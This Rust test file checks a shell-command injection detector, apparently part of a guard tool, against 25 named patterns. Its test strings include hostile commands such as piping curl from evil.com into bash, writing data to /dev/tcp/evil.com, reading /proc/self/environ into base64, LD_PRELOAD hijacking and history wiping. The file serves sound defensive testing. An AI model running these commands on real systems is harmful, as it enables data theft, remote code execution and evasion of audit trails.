use sh_guard_core::test_internals::rules;
use sh_guard_core::types::*;
use std::collections::HashSet;

// ========================================================
// Helper
// ========================================================

fn detect(unquoted: &str, raw: &str) -> Vec<&'static str> {
    rules::injection::detect_injections(unquoted, raw)
        .into_iter()
        .map(|(name, _, _, _)| name)
        .collect()
}

fn detects_pattern(name: &str, unquoted: &str, raw: &str) -> bool {
    detect(unquoted, raw).contains(&name)
}

// ========================================================
// No duplicate pattern names
// ========================================================

#[test]
fn no_duplicate_pattern_names() {
    let mut seen = HashSet::new();
    for p in rules::injection::INJECTION_PATTERNS {
        assert!(
            seen.insert(p.name),
            "duplicate injection pattern name: '{}'",
            p.name
        );
    }
}

// ========================================================
// Pattern count
// ========================================================

#[test]
fn at_least_25_injection_patterns() {
    assert!(
        rules::injection::INJECTION_PATTERNS.len() >= 25,
        "expected at least 25 injection patterns, got {}",
        rules::injection::INJECTION_PATTERNS.len()
    );
}

// ========================================================
// All descriptions and names are non-empty
// ========================================================

#[test]
fn all_descriptions_non_empty() {
    for p in rules::injection::INJECTION_PATTERNS {
        assert!(!p.description.is_empty(), "pattern '{}' has empty description", p.name);
    }
}

#[test]
fn all_names_non_empty() {
    for p in rules::injection::INJECTION_PATTERNS {
        assert!(!p.name.is_empty(), "found pattern with empty name");
    }
}

#[test]
fn all_scores_nonzero() {
    for p in rules::injection::INJECTION_PATTERNS {
        assert!(p.score > 0, "pattern '{}' has zero score", p.name);
    }
}

// ========================================================
// 1. command_substitution_dollar
// ========================================================

#[test]
fn command_substitution_dollar_positive() {
    assert!(detects_pattern("command_substitution_dollar", "echo $(whoami)", "echo $(whoami)"));
}

#[test]
fn command_substitution_dollar_negative() {
    assert!(!detects_pattern("command_substitution_dollar", "echo hello", "echo hello"));
}

#[test]
fn command_substitution_dollar_not_in_quoted() {
    // The detect_fn checks the unquoted param; if the text is single-quoted,
    // the caller would not pass it in unquoted. So passing empty unquoted means no match.
    assert!(!detects_pattern("command_substitution_dollar", "", "echo '$(whoami)'"));
}

// ========================================================
// 2. command_substitution_backtick
// ========================================================

#[test]
fn command_substitution_backtick_positive() {
    assert!(detects_pattern("command_substitution_backtick", "echo `whoami`", "echo `whoami`"));
}

#[test]
fn command_substitution_backtick_negative() {
    assert!(!detects_pattern("command_substitution_backtick", "echo hello", "echo hello"));
}

#[test]
fn command_substitution_backtick_not_in_quoted() {
    assert!(!detects_pattern("command_substitution_backtick", "", "echo '`whoami`'"));
}

// ========================================================
// 3. process_substitution_in
// ========================================================

#[test]
fn process_substitution_in_positive() {
    assert!(detects_pattern("process_substitution_in", "diff <(ls) <(ls -a)", "diff <(ls) <(ls -a)"));
}

#[test]
fn process_substitution_in_negative() {
    assert!(!detects_pattern("process_substitution_in", "echo hello < file.txt", "echo hello < file.txt"));
}

// ========================================================
// 4. process_substitution_out
// ========================================================

#[test]
fn process_substitution_out_positive() {
    assert!(detects_pattern("process_substitution_out", "tee >(grep err)", "tee >(grep err)"));
}

#[test]
fn process_substitution_out_negative() {
    assert!(!detects_pattern("process_substitution_out", "echo hello > file.txt", "echo hello > file.txt"));
}

// ========================================================
// 5. parameter_expansion
// ========================================================

#[test]
fn parameter_expansion_positive() {
    assert!(detects_pattern("parameter_expansion", "echo ${HOME}", "echo ${HOME}"));
}

#[test]
fn parameter_expansion_negative() {
    assert!(!detects_pattern("parameter_expansion", "echo $HOME", "echo $HOME"));
}

#[test]
fn parameter_expansion_not_in_quoted() {
    assert!(!detects_pattern("parameter_expansion", "", "echo '${HOME}'"));
}

// ========================================================
// 6. ifs_injection
// ========================================================

#[test]
fn ifs_injection_dollar_ifs_positive() {
    assert!(detects_pattern("ifs_injection", "cmd$IFSarg", "cmd$IFSarg"));
}

#[test]
fn ifs_injection_brace_positive() {
    assert!(detects_pattern("ifs_injection", "cmd${IFS}arg", "cmd${IFS}arg"));
}

#[test]
fn ifs_injection_negative() {
    assert!(!detects_pattern("ifs_injection", "echo hello", "echo hello"));
}

// ========================================================
// 7. arithmetic_expansion
// ========================================================

#[test]
fn arithmetic_expansion_positive() {
    assert!(detects_pattern("arithmetic_expansion", "echo $((1+2))", "echo $((1+2))"));
}

#[test]
fn arithmetic_expansion_negative() {
    assert!(!detects_pattern("arithmetic_expansion", "echo $(whoami)", "echo $(whoami)"));
}

// ========================================================
// 8. unicode_whitespace
// ========================================================

#[test]
fn unicode_whitespace_positive() {
    // U+00A0 non-breaking space
    assert!(detects_pattern("unicode_whitespace", "echo hello", "echo\u{00A0}hello"));
}

#[test]
fn unicode_whitespace_negative() {
    assert!(!detects_pattern("unicode_whitespace", "echo hello", "echo hello"));
}

#[test]
fn unicode_whitespace_tab_is_safe() {
    assert!(!detects_pattern("unicode_whitespace", "echo\thello", "echo\thello"));
}

// ========================================================
// 9. control_characters
// ========================================================

#[test]
fn control_characters_positive() {
    // 0x01 = SOH control character
    assert!(detects_pattern("control_characters", "echo hello", "echo\x01hello"));
}

#[test]
fn control_characters_negative() {
    assert!(!detects_pattern("control_characters", "echo hello", "echo hello"));
}

#[test]
fn control_characters_tab_newline_safe() {
    // \t (0x09) and \n (0x0A) and \r (0x0D) are not in the detection range
    assert!(!detects_pattern("control_characters", "echo\thello", "echo\thello\n"));
}

// ========================================================
// 10. carriage_return
// ========================================================

#[test]
fn carriage_return_positive() {
    assert!(detects_pattern("carriage_return", "echo hello", "echo hello\r"));
}

#[test]
fn carriage_return_negative() {
    assert!(!detects_pattern("carriage_return", "echo hello", "echo hello"));
}

// ========================================================
// 11. ansi_c_quoting
// ========================================================

#[test]
fn ansi_c_quoting_single_positive() {
    assert!(detects_pattern("ansi_c_quoting", "echo", "echo $'\\x41'"));
}

#[test]
fn ansi_c_quoting_double_positive() {
    assert!(detects_pattern("ansi_c_quoting", "echo", "echo $\"hello\""));
}

#[test]
fn ansi_c_quoting_negative() {
    assert!(!detects_pattern("ansi_c_quoting", "echo 'hello'", "echo 'hello'"));
}

// ========================================================
// 12. escaped_semicolon
// ========================================================

#[test]
fn escaped_semicolon_positive() {
    assert!(detects_pattern("escaped_semicolon", "find . -name x", "find . -name x \\;"));
}

#[test]
fn escaped_semicolon_negative() {
    assert!(!detects_pattern("escaped_semicolon", "echo hello; ls", "echo hello; ls"));
}

// ========================================================
// 13. escaped_pipe
// ========================================================

#[test]
fn escaped_pipe_positive() {
    assert!(detects_pattern("escaped_pipe", "echo test", "echo test \\| grep foo"));
}

#[test]
fn escaped_pipe_negative() {
    assert!(!detects_pattern("escaped_pipe", "echo test | grep foo", "echo test | grep foo"));
}

// ========================================================
// 14. escaped_ampersand
// ========================================================

#[test]
fn escaped_ampersand_positive() {
    assert!(detects_pattern("escaped_ampersand", "echo test", "echo test \\&"));
}

#[test]
fn escaped_ampersand_negative() {
    assert!(!detects_pattern("escaped_ampersand", "echo test &", "echo test &"));
}

// ========================================================
// 15. brace_expansion
// ========================================================

#[test]
fn brace_expansion_positive() {
    assert!(detects_pattern("brace_expansion", "echo {a,b,c}", "echo {a,b,c}"));
}

#[test]
fn brace_expansion_negative_no_comma() {
    assert!(!detects_pattern("brace_expansion", "echo {hello}", "echo {hello}"));
}

#[test]
fn brace_expansion_negative_no_braces() {
    assert!(!detects_pattern("brace_expansion", "echo hello", "echo hello"));
}

#[test]
fn brace_expansion_not_in_quoted() {
    assert!(!detects_pattern("brace_expansion", "", "echo '{a,b}'"));
}

// ========================================================
// 16. proc_environ_access
// ========================================================

#[test]
fn proc_environ_access_self_positive() {
    assert!(detects_pattern("proc_environ_access", "cat /proc/self/environ", "cat /proc/self/environ"));
}

#[test]
fn proc_environ_access_pid_positive() {
    assert!(detects_pattern("proc_environ_access", "cat /proc/1/environ", "cat /proc/1/environ"));
}

#[test]
fn proc_environ_access_negative() {
    assert!(!detects_pattern("proc_environ_access", "cat /proc/self/status", "cat /proc/self/status"));
}

// ========================================================
// 17. dev_tcp_udp
// ========================================================

#[test]
fn dev_tcp_positive() {
    assert!(detects_pattern("dev_tcp_udp", "echo > /dev/tcp/1.2.3.4/80", "echo > /dev/tcp/1.2.3.4/80"));
}

#[test]
fn dev_udp_positive() {
    assert!(detects_pattern("dev_tcp_udp", "echo > /dev/udp/1.2.3.4/53", "echo > /dev/udp/1.2.3.4/53"));
}

#[test]
fn dev_tcp_udp_negative() {
    assert!(!detects_pattern("dev_tcp_udp", "cat /dev/null", "cat /dev/null"));
}

// ========================================================
// 18. base64_pipe
// ========================================================

#[test]
fn base64_pipe_positive() {
    assert!(detects_pattern("base64_pipe", "cat secret | base64", "cat secret | base64"));
}

#[test]
fn base64_redirect_positive() {
    assert!(detects_pattern("base64_pipe", "base64 file > out", "base64 file > out"));
}

#[test]
fn base64_pipe_negative() {
    assert!(!detects_pattern("base64_pipe", "base64 file", "base64 file"));
}

// ========================================================
// 19. eval_usage
// ========================================================

#[test]
fn eval_usage_start_positive() {
    assert!(detects_pattern("eval_usage", "eval echo hello", "eval echo hello"));
}

#[test]
fn eval_usage_middle_positive() {
    assert!(detects_pattern("eval_usage", "cmd; eval echo hello", "cmd; eval echo hello"));
}

#[test]
fn eval_usage_negative() {
    assert!(!detects_pattern("eval_usage", "echo eval", "echo eval"));
}

#[test]
fn eval_usage_negative_substring() {
    // "evaluate" should not match
    assert!(!detects_pattern("eval_usage", "evaluate something", "evaluate something"));
}

// ========================================================
// 20. hex_escape_sequences
// ========================================================

#[test]
fn hex_escape_positive() {
    assert!(detects_pattern("hex_escape_sequences", "echo", "echo \\x41"));
}

#[test]
fn unicode_escape_positive() {
    assert!(detects_pattern("hex_escape_sequences", "echo", "echo \\u0041"));
}

#[test]
fn hex_escape_negative() {
    assert!(!detects_pattern("hex_escape_sequences", "echo hello", "echo hello"));
}

// ========================================================
// 21. ld_preload
// ========================================================

#[test]
fn ld_preload_positive() {
    assert!(detects_pattern("ld_preload", "LD_PRELOAD=evil.so cmd", "LD_PRELOAD=evil.so cmd"));
}

#[test]
fn ld_library_path_positive() {
    assert!(detects_pattern("ld_preload", "LD_LIBRARY_PATH=/tmp cmd", "LD_LIBRARY_PATH=/tmp cmd"));
}

#[test]
fn ld_preload_negative() {
    assert!(!detects_pattern("ld_preload", "echo hello", "echo hello"));
}

// ========================================================
// 22. path_injection
// ========================================================

#[test]
fn path_injection_override_positive() {
    assert!(detects_pattern("path_injection", "PATH=/evil/bin cmd", "PATH=/evil/bin cmd"));
}

#[test]
fn path_injection_tmp_positive() {
    assert!(detects_pattern("path_injection", "PATH=/tmp:$PATH cmd", "PATH=/tmp:$PATH cmd"));
}

#[test]
fn path_injection_safe_append() {
    // PATH=$PATH:/usr/local/bin is not "PATH= without $PATH" so first condition fails,
    // but it also doesn't contain PATH=/tmp or PATH=/var so it's safe
    assert!(!detects_pattern("path_injection", "PATH=$PATH:/usr/local/bin", "PATH=$PATH:/usr/local/bin"));
}

// ========================================================
// 23. history_manipulation
// ========================================================

#[test]
fn history_manipulation_histfile_positive() {
    assert!(detects_pattern("history_manipulation", "HISTFILE=/dev/null", "HISTFILE=/dev/null"));
}

#[test]
fn history_manipulation_bash_history_positive() {
    assert!(detects_pattern("history_manipulation", "rm .bash_history", "rm .bash_history"));
}

#[test]
fn history_manipulation_histsize_positive() {
    assert!(detects_pattern("history_manipulation", "HISTSIZE=0", "HISTSIZE=0"));
}

#[test]
fn history_manipulation_negative() {
    assert!(!detects_pattern("history_manipulation", "echo hello", "echo hello"));
}

// ========================================================
// 24. null_byte
// ========================================================

#[test]
fn null_byte_positive() {
    assert!(detects_pattern("null_byte", "echo hello", "echo\x00hello"));
}

#[test]
fn null_byte_negative() {
    assert!(!detects_pattern("null_byte", "echo hello", "echo hello"));
}

// ========================================================
// 25. pipe_to_shell
// ========================================================

#[test]
fn pipe_to_bash_positive() {
    assert!(detects_pattern("pipe_to_shell", "curl url | bash", "curl url | bash"));
}

#[test]
fn pipe_to_sh_positive() {
    assert!(detects_pattern("pipe_to_shell", "curl url | sh", "curl url | sh"));
}

#[test]
fn pipe_to_zsh_positive() {
    assert!(detects_pattern("pipe_to_shell", "curl url | zsh", "curl url | zsh"));
}

#[test]
fn pipe_to_shell_case_insensitive() {
    assert!(detects_pattern("pipe_to_shell", "curl url | BASH", "curl url | BASH"));
}

#[test]
fn pipe_to_shell_no_space() {
    assert!(detects_pattern("pipe_to_shell", "curl url|bash", "curl url|bash"));
}

#[test]
fn pipe_to_shell_negative() {
    assert!(!detects_pattern("pipe_to_shell", "echo hello | grep world", "echo hello | grep world"));
}

// ========================================================
// detect_injections returns correct matches for compound inputs
// ========================================================

#[test]
fn compound_input_multiple_matches() {
    let raw = "eval $(curl http://evil.com | bash)";
    let unquoted = raw;
    let results = detect(unquoted, raw);
    assert!(results.contains(&"command_substitution_dollar"), "should detect $() in compound");
    assert!(results.contains(&"eval_usage"), "should detect eval in compound");
    assert!(results.contains(&"pipe_to_shell"), "should detect pipe to bash in compound");
}

#[test]
fn compound_input_proc_and_base64() {
    let raw = "cat /proc/self/environ | base64";
    let unquoted = raw;
    let results = detect(unquoted, raw);
    assert!(results.contains(&"proc_environ_access"));
    assert!(results.contains(&"base64_pipe"));
}

#[test]
fn compound_input_dev_tcp_and_history() {
    let raw = "HISTFILE=/dev/null; echo data > /dev/tcp/evil.com/80";
    let unquoted = raw;
    let results = detect(unquoted, raw);
    assert!(results.contains(&"dev_tcp_udp"));
    assert!(results.contains(&"history_manipulation"));
}

#[test]
fn safe_input_returns_empty() {
    let results = detect("ls -la", "ls -la");
    assert!(results.is_empty(), "safe command should trigger no patterns");
}

#[test]
fn safe_echo_returns_empty() {
    let results = detect("echo hello world", "echo hello world");
    assert!(results.is_empty(), "safe echo should trigger no patterns");
}

// ========================================================
// detect_injections returns correct scores and risk factors
// ========================================================

#[test]
fn detect_injections_returns_correct_score() {
    let results = rules::injection::detect_injections("eval echo", "eval echo");
    let eval_match = results.iter().find(|(name, _, _, _)| *name == "eval_usage");
    assert!(eval_match.is_some());
    let (_, score, risk, _) = eval_match.unwrap();
    assert_eq!(*score, 50);
    assert_eq!(*risk, RiskFactor::CommandExecution);
}

#[test]
fn detect_injections_dev_tcp_returns_correct_fields() {
    let results = rules::injection::detect_injections("echo > /dev/tcp/x/80", "echo > /dev/tcp/x/80");
    let m = results.iter().find(|(name, _, _, _)| *name == "dev_tcp_udp");
    assert!(m.is_some());
    let (_, score, risk, desc) = m.unwrap();
    assert_eq!(*score, 55);
    assert_eq!(*risk, RiskFactor::NetworkExfiltration);
    assert!(!desc.is_empty());
}

// ========================================================
// Every pattern in INJECTION_PATTERNS has at least one
// positive and one negative test above (verified by name)
// ========================================================

#[test]
fn every_pattern_has_at_least_one_positive_match() {
    // Build a set of (pattern_name, positive_input) pairs
    let positive_inputs: Vec<(&str, &str, &str)> = vec![
        ("command_substitution_dollar", "echo $(whoami)", "echo $(whoami)"),
        ("command_substitution_backtick", "echo `whoami`", "echo `whoami`"),
        ("process_substitution_in", "diff <(ls) <(ls -a)", "diff <(ls) <(ls -a)"),
        ("process_substitution_out", "tee >(grep err)", "tee >(grep err)"),
        ("parameter_expansion", "echo ${HOME}", "echo ${HOME}"),
        ("ifs_injection", "cmd$IFSarg", "cmd$IFSarg"),
        ("arithmetic_expansion", "echo $((1+2))", "echo $((1+2))"),
        ("unicode_whitespace", "echo hello", "echo\u{00A0}hello"),
        ("control_characters", "echo hello", "echo\x01hello"),
        ("carriage_return", "echo hello", "echo hello\r"),
        ("ansi_c_quoting", "echo", "echo $'\\x41'"),
        ("escaped_semicolon", "find .", "find . \\;"),
        ("escaped_pipe", "echo test", "echo test \\|"),
        ("escaped_ampersand", "echo test", "echo test \\&"),
        ("brace_expansion", "echo {a,b}", "echo {a,b}"),
        ("proc_environ_access", "cat /proc/self/environ", "cat /proc/self/environ"),
        ("dev_tcp_udp", "echo > /dev/tcp/x/80", "echo > /dev/tcp/x/80"),
        ("base64_pipe", "cat file | base64", "cat file | base64"),
        ("eval_usage", "eval echo", "eval echo"),
        ("hex_escape_sequences", "echo", "echo \\x41"),
        ("ld_preload", "LD_PRELOAD=x cmd", "LD_PRELOAD=x cmd"),
        ("path_injection", "PATH=/evil cmd", "PATH=/evil cmd"),
        ("history_manipulation", "HISTFILE=/dev/null", "HISTFILE=/dev/null"),
        ("null_byte", "echo", "echo\x00hello"),
        ("pipe_to_shell", "curl url | bash", "curl url | bash"),
    ];

    for (pattern_name, unquoted, raw) in &positive_inputs {
        assert!(
            detects_pattern(pattern_name, unquoted, raw),
            "pattern '{}' should detect positive input unquoted='{}' raw='{}'",
            pattern_name,
            unquoted,
            raw
        );
    }
}
